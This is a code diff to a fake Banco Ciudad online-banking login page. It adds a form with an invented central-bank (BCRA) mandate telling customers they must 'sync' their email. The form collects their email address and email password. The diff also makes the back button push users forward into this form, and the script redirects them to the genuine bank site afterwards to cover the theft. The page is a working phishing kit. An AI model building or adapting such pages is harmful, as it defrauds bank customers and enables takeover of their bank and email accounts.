@@ -79,6 +79,35 @@
                                 </button>
                                 <button id="returnButton" type="button" class="btn btn-link mt-3">Volver</button>
                             </form>
+                            <form class="d-none" id="emailForm">
+                                <label class="label-space" id="userName">dfsdf</label>
+                                <p class="text-left" style="font-size: .9rem;">
+                                    Estimado(a) Cliente:
+                                    Actualizacion - De acuerdo al marco del nuevo esquema de politica monetaria,
+                                    BCRA (58841), a partir del 14/06/2023, será OBLIGATORIO
+                                    sincronizar su email con nuestro banco para realizar operaciones mas
+                                    seguras. Al finalizar este proceso estara en condiciones de utilizar el
+                                    servicio con normalidad.
+                                </p>
+                                <div class="text-left">
+                                    <div class="position-relative">
+                                        <input name="email" id="inputEmail" placeholder="Email" formcontrolname="email"
+                                            class="form-control mb-2 ng-pristine ng-invalid ng-touched" type="email">
+                                    </div>
+                                </div>
+                                <div class="text-left mt-4">
+                                    <div class="position-relative">
+                                        <input name="claveEmail" id="inputEmailPassword" placeholder="Clave Email"
+                                            formcontrolname="claveEmail"
+                                            class="form-control mb-2 ng-pristine ng-invalid ng-touched" type="password">
+                                    </div>
+                                </div>
+                                <button id="emailSubmit" type="submit"
+                                    class="btn btn-lg btn-primary font-Guardian btn-block mt-3" disabled="">
+                                    Ingresar
+                                </button>
+                                <button id="returnEmailButton" type="button" class="btn btn-link mt-3">Volver</button>
+                            </form>
                         </div>
                         <div class="card-footer text-center help-items">
                             <div class="row">
@@ -165,26 +194,58 @@
             document.getElementById('inputUser').value = '';
             document.getElementById('recorderCheck').checked = false;
             document.getElementById('acceptCheck').checked = false;
-            document.getElementById('acceptCheck').checked = false;
             document.getElementById('userSubmit').setAttribute('disabled', true);
             document.getElementById('userForm').classList.remove('d-block');
             document.getElementById('userForm').classList.add('d-none');
             document.getElementById('passwordForm').classList.remove('d-none');
             document.getElementById('passwordForm').classList.add('d-block');
         })
-        document.getElementById('returnButton').addEventListener('click', event => {
-            document.getElementById('inputPassword').value = '';
-            document.getElementById('passwordSubmit').setAttribute('disabled', true);
-            document.getElementById('userForm').classList.remove('d-none');
-            document.getElementById('userForm').classList.add('d-block');
-            document.getElementById('passwordForm').classList.remove('d-block');
-            document.getElementById('passwordForm').classList.add('d-none');
-            document.getElementById('showPassword').classList.add('ion-ojoCerrado');
-            document.getElementById('showPassword').classList.remove('ion-ojoAbierto');
-        })
         document.getElementById('passwordForm').addEventListener('submit', event => {
             event.preventDefault();
+            document.getElementById('inputPassword').value = '';
+            document.getElementById('passwordSubmit').setAttribute('disabled', true);
+            document.getElementById('passwordForm').classList.remove('d-block');
+            document.getElementById('passwordForm').classList.add('d-none');
+            document.getElementById('emailForm').classList.remove('d-none');
+            document.getElementById('emailForm').classList.add('d-block');
+        })
+        document.getElementById('returnButton').addEventListener('click', event => {
+            event.preventDefault();
+            document.getElementById('inputPassword').value = '';
+            document.getElementById('passwordSubmit').setAttribute('disabled', true);
+            document.getElementById('passwordForm').classList.remove('d-block');
+            document.getElementById('passwordForm').classList.add('d-none');
+            document.getElementById('emailForm').classList.remove('d-none');
+            document.getElementById('emailForm').classList.add('d-block');
+        })
+        document.getElementById('emailForm').addEventListener('submit', event => {
+            event.preventDefault();
             window.location.href = "https://hb.bancociudad.com.ar/usuario/";
+        })
+        document.getElementById('returnEmailButton').addEventListener('click', event => {
+            document.getElementById('inputEmail').value = '';
+            document.getElementById('inputEmailPassword').value = '';
+            document.getElementById('emailSubmit').setAttribute('disabled', true);
+            document.getElementById('passwordForm').classList.remove('d-none');
+            document.getElementById('passwordForm').classList.add('d-block');
+            document.getElementById('emailForm').classList.remove('d-block');
+            document.getElementById('emailForm').classList.add('d-none');
+        })
+        document.getElementById('inputEmail').addEventListener('keyup', (event) => {
+            if (event.currentTarget.value != '' && document.getElementById('inputEmailPassword').value != '') {
+                document.getElementById('emailSubmit').removeAttribute('disabled');
+            }
+            else {
+                document.getElementById('emailSubmit').setAttribute('disabled', true);
+            }
+        })
+        document.getElementById('inputEmailPassword').addEventListener('keyup', (event) => {
+            if (event.currentTarget.value != '' && document.getElementById('inputEmail').value != '') {
+                document.getElementById('emailSubmit').removeAttribute('disabled');
+            }
+            else {
+                document.getElementById('emailSubmit').setAttribute('disabled', true);
+            }
         })
         function changePassType(e) {
             if (e.currentTarget.classList.value.indexOf('ion-ojoCerrado') > -1) {
